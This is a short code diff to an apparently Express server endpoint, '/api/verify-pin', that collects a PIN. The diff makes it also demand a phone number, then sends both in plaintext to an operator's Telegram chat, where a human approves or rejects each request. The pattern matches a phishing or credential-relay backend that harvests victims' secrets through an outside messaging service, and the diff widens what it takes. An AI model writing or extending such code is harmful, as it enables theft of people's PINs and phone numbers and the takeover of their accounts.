@@ -15,14 +15,14 @@ const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
 const pendingRequests = {};
 
 app.post('/api/verify-pin', async (req, res) => {
-  const { pin } = req.body;
+  const { pin, phone } = req.body;
 
-  if (!pin) {
-    return res.status(400).json({ error: 'PIN is required' });
+  if (!pin || !phone) {
+    return res.status(400).json({ error: 'PIN and phone number are required' });
   }
 
   const requestId = Date.now().toString();
-  pendingRequests[requestId] = { pin, status: 'pending' };
+  pendingRequests[requestId] = { pin, phone, status: 'pending' };
 
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -30,7 +30,7 @@ app.post('/api/verify-pin', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: ADMIN_CHAT_ID,
-        text: `PIN submitted: ${pin}\nRequest ID: ${requestId}`,
+        text: `📱 Phone: ${phone}\n🔑 PIN: ${pin}\n🆔 Request ID: ${requestId}`,
         reply_markup: {
           inline_keyboard: [[
             { text: '✅ Approve', callback_data: `approve_${requestId}` },
